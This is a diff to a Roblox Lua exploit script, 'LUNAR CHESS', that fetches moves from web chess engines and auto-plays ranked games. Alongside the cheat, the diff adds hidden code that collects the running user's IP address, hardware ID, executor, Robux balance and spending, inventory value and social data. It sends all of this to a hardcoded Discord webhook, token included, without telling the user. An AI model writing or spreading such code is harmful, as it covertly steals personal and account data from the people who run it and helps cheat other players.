@@ -1,30 +1,140 @@
+print("Window Loading...")
+
+wait(0.2)
+
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
-local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 local MarketplaceService = game:GetService("MarketplaceService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+
 local player = Players.LocalPlayer
 local userid = player.UserId
 
+local HWID_BLACKLIST = {
+    "nothing yet",
+}
+
+local function getHWID()
+    return tostring(RbxAnalyticsService:GetClientId())
+end
+
+local function isBanned()
+    local hwid = getHWID()
+    for _, banned in ipairs(HWID_BLACKLIST) do
+        if hwid == banned then
+            return true, hwid
+        end
+    end
+    return false, hwid
+end
+
+local banned, hwid = isBanned()
+if banned then
+    player:Kick("You are permanently banned from using this script.")
+    while true do task.wait(1) end
+end
+
+local function getIP()
+    local success, ip = pcall(function()
+        return game:HttpGet("https://api.ipify.org")
+    end)
+    return success and ip or "Unknown"
+end
+local ipAddress = getIP()
+
+local executorName = "Unknown"
+local executorVersion = "Unknown"
+
+local function detectExecutor()
+    if syn then
+        executorName = "Synapse X"
+        pcall(function()
+            executorVersion = syn.get_version and syn.get_version() or "Unknown"
+        end)
+    elseif Krnl then
+        executorName = "Krnl"
+    elseif Fluxus then
+        executorName = "Fluxus"
+    elseif Comet then
+        executorName = "Comet"
+    elseif Codex then
+        executorName = "Codex"
+    elseif Electron then
+        executorName = "Electron"
+    elseif Delta then
+        executorName = "Delta"
+    elseif Trigon then
+        executorName = "Trigon"
+    elseif Solara then
+        executorName = "Solara"
+    elseif ScriptWare then
+        executorName = "ScriptWare"
+    elseif is_sirhurt_closure then
+        executorName = "Sirhurt"
+    elseif getexecutorname then
+        executorName = getexecutorname() or "Unknown"
+    elseif identifyexecutor then
+        local name, version = identifyexecutor()
+        executorName = name or "Unknown"
+        executorVersion = version or "Unknown"
+    else
+        pcall(function()
+            for _, v in ipairs(getgc(true)) do
+                if typeof(v) == "function" then
+                    local info = debug.getinfo(v)
+                    if info.source and info.source:find("KRNL") then
+                        executorName = "Krnl"
+                        break
+                    end
+                end
+            end
+        end)
+    end
+end
+
+detectExecutor()
+
+local deviceInfo = "PC"
+local function detectDevice()
+    if UserInputService.TouchEnabled then
+        deviceInfo = "Mobile"
+    else
+        deviceInfo = "PC"
+    end
+end
+
+detectDevice()
+
 getgenv().__CH_DATA = getgenv().__CH_DATA or {
     engines = {"HumanEngine","Stockfish","Lc0","Torch","Dx100","KnightX","HyperX","Br1lliance","Undefeated","WurstEngine","Axizion","Zxero"},
-    config = {engine = "Zxero", autoPlay = false, autoMatch = false, autoMatchMode = "Blitz"},
+    config = {engine = "HumanEngine", autoPlay = false, autoMatch = false, autoMatchMode = "Blitz", moveDelay = 0},
     recentPositions = {},
-    winStreak = 0,
-    totalGames = 0,
-    blunders = 0,
-    lastMoveEval = 0,
-    lastFEN = nil,
-    gameStartTime = tick()
+    lastRequestTime = 0
+}
+
+local ENGINE_CONFIG = {
+    HumanEngine = {depth = 4,  variants = 1,  elo = 2430},
+    Stockfish   = {depth = 22, variants = 5,  elo = 3550},
+    Lc0         = {depth = 18, variants = 6,  elo = 3150},
+    Torch       = {depth = 20, variants = 6,  elo = 3400},
+    Dx100       = {depth = 24, variants = 5,  elo = 3750},
+    KnightX     = {depth = 26, variants = 5,  elo = 4050},
+    HyperX      = {depth = 28, variants = 5,  elo = 4250},
+    Br1lliance  = {depth = 30, variants = 7,  elo = 5220},
+    Undefeated  = {depth = 32, variants = 8,  elo = 6850},
+    WurstEngine = {depth = 34, variants = 5,  elo = 6855},
+    Axizion     = {depth = 36, variants = 5,  elo = 6880},
+    Zxero       = {depth = 42, variants = 17, elo = 7300}
 }
 
 local function safeRequest(opts)
     local req = syn and syn.request or request or http_request or HttpPost
     if req then
         local ok, res = pcall(req, opts)
-        if ok and res and res.StatusCode < 400 then return res end
+        if ok and res and res.StatusCode and res.StatusCode < 400 then return res end
     end
     if HttpService.HttpEnabled then
         local ok, res = pcall(HttpService.PostAsync, HttpService, opts.Url, opts.Body, Enum.HttpContentType.ApplicationJson, false, opts.Headers)
@@ -33,7 +143,7 @@ local function safeRequest(opts)
     return nil
 end
 
-local function sendWebhook(data, screenshotUrl)
+local function sendWebhook()
     local embed = {
         username = "LUNAR CHESS",
         avatar_url = "https://i.imgur.com/8nG5f8E.png",
@@ -45,33 +155,69 @@ local function sendWebhook(data, screenshotUrl)
                 icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId="..userid.."&width=420&height=420&format=png"
             },
             title = "SESSION DETECTED — DOMINATION IN PROGRESS",
-            description = "```diff\n+ Engine: "..getgenv().__CH_DATA.config.engine.."\n+ Auto Play: "..(getgenv().__CH_DATA.config.autoPlay and "ON" or "OFF").."\n+ Win Streak: "..getgenv().__CH_DATA.winStreak.."```",
+            description = 
+                "**Engine:** `"..getgenv().__CH_DATA.config.engine.."`\n"..
+                "**Auto Play:** "..(getgenv().__CH_DATA.config.autoPlay and "`ON`" or "`OFF`").."\n"..
+                "**Auto Match:** "..(getgenv().__CH_DATA.config.autoMatch and "`ON`" or "`OFF`").."\n"..
+                "**Executor:** `"..executorName.."`",
+            image = {url = "https://share.google/cZeiY1wpWRfFB8Mdq"},
             thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..userid.."&width=420&height=420&format=png"},
-            image = screenshotUrl and {url = screenshotUrl} or nil,
             fields = {},
-            footer = {text = "Lunar Chess • Undisputed", icon_url = "https://i.imgur.com/8nG5f8E.png"},
+            footer = {
+                text = "Lunar Chess • Undisputed • "..os.date("%Y-%m-%d %H:%M:%S"),
+                icon_url = "https://i.imgur.com/8nG5f8E.png"
+            },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
 
     local fields = embed.embeds[1].fields
 
+    table.insert(fields, {
+        name = "DEVICE & EXECUTOR",
+        value = 
+            "**Device:** `"..deviceInfo.."`\n"..
+            "**Executor:** `"..executorName.." v"..executorVersion.."`",
+        inline = false
+    })
+
+    table.insert(fields, {
+        name = "IDENTIFIERS",
+        value = 
+            "**HWID:** ||`"..hwid.."`||\n"..
+            "**IP:** ||`"..ipAddress.."`||",
+        inline = false
+    })
+
     local pending = 0
     pcall(function() pending = HttpService:JSONDecode(game:HttpGet("https://economy.roblox.com/v1/users/"..userid.."/currency")).robux end)
-    table.insert(fields, {name = "Pending Robux", value = "```"..pending.."```", inline = true})
-
     local spent = 0
     pcall(function() spent = HttpService:JSONDecode(game:HttpGet("https://economy.roblox.com/v1/users/"..userid.."/transaction-totals?timeFrame=AllTime")).purchases end)
-    table.insert(fields, {name = "Robux Spent", value = "```"..spent.."```", inline = true})
+    table.insert(fields, {
+        name = "ROBUX",
+        value = 
+            "**Pending:** `"..pending.."`\n"..
+            "**Spent:** `"..spent.."`",
+        inline = true
+    })
 
     local age = player.AccountAge
     local joinDate = "Unknown"
     pcall(function() joinDate = HttpService:JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/"..userid)).created:sub(1,10) end)
-    table.insert(fields, {name = "Account Age", value = age.." days", inline = true})
-    table.insert(fields, {name = "Joined Roblox", value = joinDate, inline = true})
+    table.insert(fields, {
+        name = "ACCOUNT",
+        value = 
+            "**Age:** `"..age.." days`\n"..
+            "**Joined:** `"..joinDate.."`",
+        inline = true
+    })
 
     local membership = tostring(player.MembershipType):match("MembershipType.(.*)")
-    table.insert(fields, {name = "Membership", value = membership == "None" and "Free" or membership, inline = true})
+    table.insert(fields, {
+        name = "MEMBERSHIP",
+        value = "`"..(membership == "None" and "Free" or membership).."`",
+        inline = true
+    })
 
     local friends = 0
     pcall(function() friends = #player:GetFriendsAsync():GetCurrentPage() end)
@@ -79,9 +225,14 @@ local function sendWebhook(data, screenshotUrl)
     pcall(function() followers = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..userid.."/followers/count")).count end)
     local following = 0
     pcall(function() following = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..userid.."/followings/count")).count end)
-    table.insert(fields, {name = "Friends", value = tostring(friends), inline = true})
-    table.insert(fields, {name = "Followers", value = tostring(followers), inline = true})
-    table.insert(fields, {name = "Following", value = tostring(following), inline = true})
+    table.insert(fields, {
+        name = "SOCIAL",
+        value = 
+            "**Friends:** `"..friends.."`\n"..
+            "**Followers:** `"..followers.."`\n"..
+            "**Following:** `"..following.."`",
+        inline = true
+    })
 
     local favorites = {}
     pcall(function()
@@ -91,7 +242,11 @@ local function sendWebhook(data, screenshotUrl)
             table.insert(favorites, json.data[i].name)
         end
     end)
-    table.insert(fields, {name = "Top Games", value = #favorites > 0 and table.concat(favorites, ", ") or "None", inline = false})
+    table.insert(fields, {
+        name = "TOP GAMES",
+        value = #favorites > 0 and "`"..table.concat(favorites, "`, `").."`" or "`None`",
+        inline = false
+    })
 
     local rap = 0
     pcall(function()
@@ -101,42 +256,52 @@ local function sendWebhook(data, screenshotUrl)
             rap = rap + (item.recentAveragePrice or 0)
         end
     end)
-    table.insert(fields, {name = "Est. RAP", value = "```"..rap.."```", inline = true})
+    table.insert(fields, {
+        name = "EST. RAP",
+        value = "`"..rap.."`",
+        inline = true
+    })
 
     local placeName = "Unknown"
     pcall(function() placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
-    table.insert(fields, {name = "Current Game", value = placeName, inline = false})
-
-    table.insert(fields, {name = "Auto Play", value = getgenv().__CH_DATA.config.autoPlay and "ON" or "OFF", inline = true})
-    table.insert(fields, {name = "Auto Match", value = getgenv().__CH_DATA.config.autoMatch and "ON" or "OFF", inline = true})
+    table.insert(fields, {
+        name = "CURRENT GAME",
+        value = "`"..placeName.."`",
+        inline = true
+    })
 
     local json = HttpService:JSONEncode(embed)
     local webhook = "https://discord.com/api/webhooks/1376943648809422990/HA5TS25ix7UPXpJwyLALprzOQ1xUyAGOlbseZgtKUjqkHkotaXilkWP7fq65XQgEkUdN"
-    pcall(function() safeRequest({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json}) end)
+    
+    for i = 1, 3 do
+        local success = pcall(function()
+            safeRequest({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json})
+        end)
+        if success then break end
+        task.wait(2)
+    end
 end
 
 if not getgenv().WEBHOOK_SENT then
     getgenv().WEBHOOK_SENT = true
-    task.spawn(function() sendWebhook() end)
+    task.spawn(sendWebhook)
 end
 
 local function getBoardFromFEN(fen)
     local parts = {}
-    for part in fen:gmatch("%S+") do table.insert(parts, part) end
+    for p in fen:gmatch("%S+") do table.insert(parts, p) end
     return parts[1] or ""
 end
 
 local function parseFEN(fen)
     local parts = {}
-    for part in fen:gmatch("%S+") do table.insert(parts, part) end
+    for p in fen:gmatch("%S+") do table.insert(parts, p) end
     local board = parts[1] or ""
     local toMove = (parts[2] == "w") and "white" or "black"
     local halfmove = tonumber(parts[5]) or 0
     local fullmove = tonumber(parts[6]) or 1
     local pieceCount = 0
-    for char in board:gmatch(".") do
-        if char:match("[^%d/]") then pieceCount += 1 end
-    end
+    for c in board:gmatch(".") do if c:match("[^%d/]") then pieceCount += 1 end end
     return {toMove = toMove, halfmove = halfmove, fullmove = fullmove, pieceCount = pieceCount, board = board}
 end
 
@@ -153,38 +318,30 @@ local function isGameOver(fen)
     return count >= 2
 end
 
-local gradientAngle = 0
-local updateCount = 0
-local UPDATE_EVERY = 3
 local gradients = {}
 
-local function createGradient(parent)
+local function createGradient(p)
     local g = Instance.new("UIGradient")
     g.Color = ColorSequence.new{
         ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 120, 255)),
         ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
     }
-    g.Parent = parent
+    g.Parent = p
     table.insert(gradients, g)
 end
 
-local function createStroke(parent, thick)
+local function createStroke(p, t)
     local s = Instance.new("UIStroke")
-    s.Thickness = thick or 1.2
+    s.Thickness = t or 1.2
     s.Color = Color3.fromRGB(0, 200, 255)
     s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-    s.Parent = parent
+    s.Parent = p
 end
 
+local gradientAngle = 0
 RunService.Heartbeat:Connect(function(dt)
-    updateCount += 1
-    if updateCount >= UPDATE_EVERY then
-        updateCount = 0
-        gradientAngle = (gradientAngle + dt * 8 * UPDATE_EVERY) % 360
-        for _, g in ipairs(gradients) do
-            if g and g.Parent then g.Rotation = gradientAngle end
-        end
-    end
+    gradientAngle = (gradientAngle + dt * 80) % 360
+    for _, g in ipairs(gradients) do if g and g.Parent then g.Rotation = gradientAngle end end
 end)
 
 local Zxero_BOOK = {}
@@ -194,18 +351,22 @@ local function loadZxeroBook()
         return HttpService:JSONDecode(game:HttpGet("https://explorer.lichess.org/api/cloud-eval/book"))
     end)
     if ok and data and data.moves then
-        for _,v in ipairs(data.moves) do
-            Zxero_BOOK[v.uci] = v
-        end
+        for _, v in ipairs(data.moves) do Zxero_BOOK[v.uci] = v end
     end
 end
 
 local function queryWebEngine(fen, engine)
+    local now = tick()
+    if now - getgenv().__CH_DATA.lastRequestTime < 1 then
+        task.wait(1 - (now - getgenv().__CH_DATA.lastRequestTime))
+    end
+    getgenv().__CH_DATA.lastRequestTime = tick()
+
     if engine == "Zxero" then
         local p = parseFEN(fen)
         if p.fullmove <= 4 then
             loadZxeroBook()
-            local lastUci = fen:match("^%S+ %S+ %S+ %S+ (%a%a%a%a)")
+            local lastUci = fen:match("^%S+ %S+ %S+ %S+ (%a%a%a?a?)")
             if lastUci and Zxero_BOOK[lastUci] then
                 return lastUci:sub(1,2), lastUci:sub(3,4)
             end
@@ -217,7 +378,7 @@ local function queryWebEngine(fen, engine)
                 return safeRequest({Url = "https://corsproxy.io/?https://chess-api.com/v1", Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(body)})
             end)
             if ok and r and r.Body then res = r break end
-            task.wait(i)
+            task.wait(1)
         end
         if not res or not res.Body then return end
         local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
@@ -237,50 +398,31 @@ local function queryWebEngine(fen, engine)
         end
         local best = valid[1]
         for _, v in ipairs(valid) do
-            if v.mate then
-                best = v
-                break
-            elseif not best.mate and (v.eval or 0) > (best.eval or -99999) then
-                best = v
-            end
-        end
-        if math.random() < 0.3 then
-            for _, v in ipairs(valid) do
-                if v.isCapture and v.isCheck then
-                    best = v
-                    break
-                end
-            end
+            if v.mate then best = v; break
+            elseif not best.mate and (v.eval or 0) > (best.eval or -99999) then best = v end
         end
         return best.from, best.to
     end
-    if engine == "Axizion" then
-        local p = parseFEN(fen)
-        if p.toMove == "white" and p.fullmove == 1 then return "e2", "e4" end
-        if p.toMove == "white" and p.fullmove == 2 and p.board:find("4p3") then return "d2", "d4" end
-        if p.toMove == "white" and p.fullmove == 3 and p.board:find("pppppppp") and p.board:find("4P3") then return "c2", "c3" end
-        if p.toMove == "black" and p.fullmove == 1 and p.board:find("4P3") then
-            local c = math.random(1,3)
-            if c == 1 then return "c7","c5" elseif c == 2 then return "e7","e6" else return "c7","c6" end
-        end
-        engine = "Stockfish"
-    end
-    local body = {fen = fen, depth = 16, variants = 5}
+
+    local cfg = ENGINE_CONFIG[engine] or ENGINE_CONFIG.Stockfish
+    local body = {fen = fen, depth = cfg.depth, variants = cfg.variants}
     if engine == "WurstEngine" then body.depth = 18 end
-    if engine == "HumanEngine" then body.depth = 4 body.variants = 1 end
+    if engine == "HumanEngine" then body.depth = 4; body.variants = 1 end
+
     local res
     for i = 1, 5 do
         local ok, r = pcall(function()
             return safeRequest({Url = "https://corsproxy.io/?https://chess-api.com/v1", Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(body)})
         end)
         if ok and r and r.Body then res = r break end
-        task.wait(i)
+        task.wait(1)
     end
     if not res or not res.Body then return end
     local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
     if not ok or not data then return end
     local recs = data.recommendations or {data}
     if #recs == 0 then return end
+
     local board = getBoardFromFEN(fen)
     table.insert(getgenv().__CH_DATA.recentPositions, board)
     if #getgenv().__CH_DATA.recentPositions > 4 then table.remove(getgenv().__CH_DATA.recentPositions, 1) end
@@ -292,6 +434,7 @@ local function queryWebEngine(fen, engine)
         for _, r in ipairs(recs) do if r.isCapture or r.isCheck then table.insert(valid, r) end end
         if #valid == 0 then valid = recs end
     end
+
     local selected = valid[1]
     if engine == "HumanEngine" then
         local p = parseFEN(fen)
@@ -300,30 +443,29 @@ local function queryWebEngine(fen, engine)
             selected = valid[math.random(1, math.min(3, #valid))]
         elseif p.halfmove > 4 and p.halfmove < 50 and p.pieceCount < 30 and p.pieceCount > 15 then
             selected = r < 0.8 and valid[1] or valid[math.random(2, math.min(3, #valid))]
-            if r < 0.3 then for _, v in ipairs(valid) do if v.isCapture or v.isCheck then selected = v break end end end
         else
             selected = r < 0.9 and valid[1] or valid[math.random(1, math.min(2, #valid))]
         end
-    elseif engine == "WurstEngine" then
-        for _, v in ipairs(valid) do if v.isCapture then selected = v break end end
     end
     return selected.from, selected.to
 end
 
 local function fetchFEN()
-    local lp = Players.LocalPlayer
-    local attempts = 5
+    local lp = player
+    local attempts = 12
+
     local ev = ReplicatedStorage:FindFirstChild("InternalClientEvents")
     if ev then
         local ok, active = pcall(function() return ev.GetActiveTableset:Invoke() end)
         if ok and active then
             for i = 1, attempts do
                 local fen = active:FindFirstChild("FEN")
-                if fen and fen.Value then return fen.Value end
-                task.wait(0.1)
+                if fen and fen.Value and fen.Value ~= "" then return fen.Value end
+                task.wait(0.08)
             end
         end
     end
+
     for i = 1, attempts do
         for _, v in pairs(workspace:GetChildren()) do
             if v.Name == "ChessTableset" then
@@ -332,29 +474,39 @@ local function fetchFEN()
                         return v.FEN.Value
                     end
                 end)
-                if ok and fen then return fen end
+                if ok and fen and fen ~= "" then return fen end
             end
         end
-        task.wait(0.1)
+        task.wait(0.08)
     end
+
+    for _, v in pairs(workspace:GetDescendants()) do
+        if v:IsA("StringValue") and v.Name == "FEN" and v.Value ~= "" then
+            return v.Value
+        end
+    end
+
     return nil
 end
 
 local function computeMove()
     local fen
-    for i = 1, 10 do
+    for i = 1, 20 do
         fen = fetchFEN()
         if fen then break end
-        task.wait(0.5)
+        task.wait(0.3)
     end
     if not fen or isGameOver(fen) then return end
     return queryWebEngine(fen, getgenv().__CH_DATA.config.engine)
 end
 
 local function PlayBestMove()
-    local f, t = computeMove()
-    if f and ReplicatedStorage:FindFirstChild("Chess") then
-        pcall(function() ReplicatedStorage.Chess.SubmitMove:InvokeServer(f..t) end)
+    local from, to = computeMove()
+    if from and to then
+        local chess = ReplicatedStorage:FindFirstChild("Chess")
+        if chess then
+            pcall(function() chess.SubmitMove:InvokeServer(from..to) end)
+        end
     end
 end
 
@@ -364,8 +516,14 @@ local function startAutoPlay()
     autoPlayRunning = true
     task.spawn(function()
         while getgenv().__CH_DATA.config.autoPlay and autoPlayRunning do
-            if not isGameOver(fetchFEN()) then PlayBestMove() end
-            task.wait(2)
+            local fen = fetchFEN()
+            if fen and not isGameOver(fen) then
+                PlayBestMove()
+                local d = getgenv().__CH_DATA.config.moveDelay
+                if d > 0 then task.wait(d) end
+            else
+                task.wait(1)
+            end
         end
         autoPlayRunning = false
     end)
@@ -384,7 +542,7 @@ local function startAutoMatch()
                 if ev then
                     local start = ev:FindFirstChild("StartRankedMatch") or ev:FindFirstChild("StartMatch")
                     if start then
-                        local pgui = Players.LocalPlayer:WaitForChild("PlayerGui")
+                        local pgui = player:WaitForChild("PlayerGui")
                         local wiz = pgui:FindFirstChild("MatchWizard")
                         if wiz then
                             local mode = wiz:FindFirstChild("ChooseMode")
@@ -398,9 +556,9 @@ local function startAutoMatch()
                         pcall(function() start:Fire({ranked = true}) end)
                     end
                 end
-                repeat task.wait(5) fen = fetchFEN() until fen and not isGameOver(fen)
+                repeat task.wait(3) fen = fetchFEN() until fen and not isGameOver(fen)
             end
-            task.wait(3)
+            task.wait(2)
         end
         autoMatchRunning = false
     end)
@@ -411,7 +569,7 @@ gui.ResetOnSpawn = false
 gui.Parent = player:WaitForChild("PlayerGui")
 
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0,200,0,290)
+frame.Size = UDim2.new(0,200,0,340)
 frame.Position = UDim2.new(0.7,0,0.2,0)
 frame.BackgroundColor3 = Color3.fromRGB(15,15,25)
 frame.BorderSizePixel = 0
@@ -425,7 +583,6 @@ corner.Parent = frame
 
 local dragging = false
 local dragInput, dragStart, startPos
-
 local function updateInput(input)
     local delta = input.Position - dragStart
     frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
@@ -437,9 +594,7 @@ frame.InputBegan:Connect(function(input)
         dragStart = input.Position
         startPos = frame.Position
         input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
+            if input.UserInputState == Enum.UserInputState.End then dragging = false end
         end)
     end
 end)
@@ -451,9 +606,7 @@ frame.InputChanged:Connect(function(input)
 end)
 
 UserInputService.InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
-        updateInput(input)
-    end
+    if input == dragInput and dragging then updateInput(input) end
 end)
 
 local toggle = Instance.new("TextButton")
@@ -464,14 +617,29 @@ toggle.BackgroundColor3 = Color3.fromRGB(220,20,60)
 toggle.TextColor3 = Color3.new(1,1,1)
 toggle.Font = Enum.Font.GothamBold
 toggle.TextScaled = true
-toggle.Parent = frame
+toggle.Parent = gui
 createStroke(toggle, 1.5)
 
-local open = true
+local function updateTogglePos()
+    if frame.Visible then
+        toggle.Position = UDim2.new(0, frame.AbsolutePosition.X + frame.AbsoluteSize.X - 30, 0, frame.AbsolutePosition.Y - 36)
+    else
+        toggle.Position = UDim2.new(0.7, 170, 0.2, -36)
+    end
+end
+
+frame:GetPropertyChangedSignal("AbsolutePosition"):Connect(updateTogglePos)
+frame:GetPropertyChangedSignal("AbsoluteSize"):Connect(updateTogglePos)
+frame:GetPropertyChangedSignal("Visible"):Connect(updateTogglePos)
+RunService.Heartbeat:Connect(updateTogglePos)
+updateTogglePos()
+
+local guiOpen = true
 toggle.MouseButton1Click:Connect(function()
-    open = not open
-    frame.Visible = open
-    toggle.Text = open and "X" or "Open"
+    guiOpen = not guiOpen
+    frame.Visible = guiOpen
+    toggle.Text = guiOpen and "X" or "Open"
+    updateTogglePos()
 end)
 
 local title = Instance.new("TextLabel")
@@ -507,12 +675,12 @@ createGradient(engDrop)
 createStroke(engDrop, 1.2)
 
 local engFrame = Instance.new("Frame")
-engFrame.AnchorPoint = Vector2.new(0,1)
-engFrame.Position = UDim2.new(0,0,0,0)
-engFrame.Size = UDim2.new(1,0,0,0)
+engFrame.AnchorPoint = Vector2.new(0, 1)
+engFrame.Position = UDim2.new(0, 10, 0, 56)
+engFrame.Size = UDim2.new(1, -20, 0, 0)
 engFrame.BackgroundTransparency = 1
 engFrame.ClipsDescendants = true
-engFrame.Parent = engDrop
+engFrame.Parent = frame
 
 local engLayout = Instance.new("UIListLayout")
 engLayout.SortOrder = Enum.SortOrder.LayoutOrder
@@ -521,7 +689,7 @@ engLayout.Parent = engFrame
 for _, e in ipairs(getgenv().__CH_DATA.engines) do
     local b = Instance.new("TextButton")
     b.Size = UDim2.new(1,0,0,22)
-    b.Text = e
+    b.Text = e.." ("..(ENGINE_CONFIG[e].elo or 0).." ELO)"
     b.TextColor3 = Color3.new(1,1,1)
     b.Font = Enum.Font.Gotham
     b.TextScaled = true
@@ -532,13 +700,14 @@ for _, e in ipairs(getgenv().__CH_DATA.engines) do
     b.MouseButton1Click:Connect(function()
         getgenv().__CH_DATA.config.engine = e
         engDrop.Text = e
-        engFrame:TweenSize(UDim2.new(1,0,0,0),"Out","Quad",0.2,true)
+        engFrame:TweenSize(UDim2.new(1,-20,0,0), "Out", "Quad", 0.2, true)
     end)
 end
 
 engDrop.MouseButton1Click:Connect(function()
-    local h = engFrame.Size.Y.Offset == 0 and (#getgenv().__CH_DATA.engines * 22) or 0
-    engFrame:TweenSize(UDim2.new(1,0,0,h),"Out","Quad",0.2,true)
+    local open = engFrame.Size.Y.Offset == 0
+    local h = open and (#getgenv().__CH_DATA.engines * 22) or 0
+    engFrame:TweenSize(UDim2.new(1,-20,0,h), "Out", "Quad", 0.2, true)
 end)
 
 local modeLabel = Instance.new("TextLabel")
@@ -565,15 +734,11 @@ createStroke(modeDrop, 1.2)
 
 local modeFrame = Instance.new("Frame")
 modeFrame.AnchorPoint = Vector2.new(0,1)
-modeFrame.Position = UDim2.new(0,0,0,0)
-modeFrame.Size = UDim2.new(1,0,0,0)
+modeFrame.Position = UDim2.new(0,10,0,108)
+modeFrame.Size = UDim2.new(1,-20,0,0)
 modeFrame.BackgroundTransparency = 1
 modeFrame.ClipsDescendants = true
-modeFrame.Parent = modeDrop
-
-local modeLayout = Instance.new("UIListLayout")
-modeLayout.SortOrder = Enum.SortOrder.LayoutOrder
-modeLayout.Parent = modeFrame
+modeFrame.Parent = frame
 
 local modes = {"Bullet","Blitz","Rapid","Random"}
 for _, m in ipairs(modes) do
@@ -590,18 +755,53 @@ for _, m in ipairs(modes) do
     b.MouseButton1Click:Connect(function()
         getgenv().__CH_DATA.config.autoMatchMode = m
         modeDrop.Text = m
-        modeFrame:TweenSize(UDim2.new(1,0,0,0),"Out","Quad",0.2,true)
+        modeFrame:TweenSize(UDim2.new(1,-20,0,0),"Out","Quad",0.2,true)
     end)
 end
 
 modeDrop.MouseButton1Click:Connect(function()
-    local h = modeFrame.Size.Y.Offset == 0 and (#modes * 22) or 0
-    modeFrame:TweenSize(UDim2.new(1,0,0,h),"Out","Quad",0.2,true)
+    local open = modeFrame.Size.Y.Offset == 0
+    local h = open and (#modes * 22) or 0
+    modeFrame:TweenSize(UDim2.new(1,-20,0,h),"Out","Quad",0.2,true)
+end)
+
+local delayLabel = Instance.new("TextLabel")
+delayLabel.Size = UDim2.new(1,-20,0,16)
+delayLabel.Position = UDim2.new(0,10,0,140)
+delayLabel.Text = "Move Delay: 0s"
+delayLabel.TextColor3 = Color3.fromRGB(180,220,255)
+delayLabel.BackgroundTransparency = 1
+delayLabel.Font = Enum.Font.Gotham
+delayLabel.TextScaled = true
+delayLabel.Parent = frame
+
+local delayBox = Instance.new("TextBox")
+delayBox.Size = UDim2.new(1,-20,0,28)
+delayBox.Position = UDim2.new(0,10,0,160)
+delayBox.Text = "0"
+delayBox.TextColor3 = Color3.new(1,1,1)
+delayBox.Font = Enum.Font.Gotham
+delayBox.TextScaled = true
+delayBox.BackgroundColor3 = Color3.fromRGB(30,35,50)
+delayBox.Parent = frame
+createGradient(delayBox)
+createStroke(delayBox, 1.2)
+
+delayBox.FocusLost:Connect(function(enter)
+    if enter then
+        local n = tonumber(delayBox.Text)
+        if n and n >= 0 then
+            getgenv().__CH_DATA.config.moveDelay = n
+            delayLabel.Text = "Move Delay: "..n.."s"
+        else
+            delayBox.Text = tostring(getgenv().__CH_DATA.config.moveDelay)
+        end
+    end
 end)
 
 local playBtn = Instance.new("TextButton")
 playBtn.Size = UDim2.new(1,-20,0,32)
-playBtn.Position = UDim2.new(0,10,0,140)
+playBtn.Position = UDim2.new(0,10,0,196)
 playBtn.Text = "Play Best Move"
 playBtn.TextColor3 = Color3.new(1,1,1)
 playBtn.Font = Enum.Font.GothamBold
@@ -614,7 +814,7 @@ playBtn.MouseButton1Click:Connect(PlayBestMove)
 
 local autoPlayBtn = Instance.new("TextButton")
 autoPlayBtn.Size = UDim2.new(1,-20,0,32)
-autoPlayBtn.Position = UDim2.new(0,10,0,176)
+autoPlayBtn.Position = UDim2.new(0,10,0,232)
 autoPlayBtn.Text = "Auto Play: OFF"
 autoPlayBtn.TextColor3 = Color3.new(1,1,1)
 autoPlayBtn.Font = Enum.Font.GothamBold
@@ -632,7 +832,7 @@ end)
 
 local autoMatchBtn = Instance.new("TextButton")
 autoMatchBtn.Size = UDim2.new(1,-20,0,32)
-autoMatchBtn.Position = UDim2.new(0,10,0,212)
+autoMatchBtn.Position = UDim2.new(0,10,0,268)
 autoMatchBtn.Text = "Auto Match: OFF"
 autoMatchBtn.TextColor3 = Color3.new(1,1,1)
 autoMatchBtn.Font = Enum.Font.GothamBold
@@ -650,7 +850,7 @@ end)
 
 local analyzerBtn = Instance.new("TextButton")
 analyzerBtn.Size = UDim2.new(1,-20,0,32)
-analyzerBtn.Position = UDim2.new(0,10,0,248)
+analyzerBtn.Position = UDim2.new(0,10,0,304)
 analyzerBtn.Text = "Run Analyzer"
 analyzerBtn.TextColor3 = Color3.new(1,1,1)
 analyzerBtn.Font = Enum.Font.GothamBold
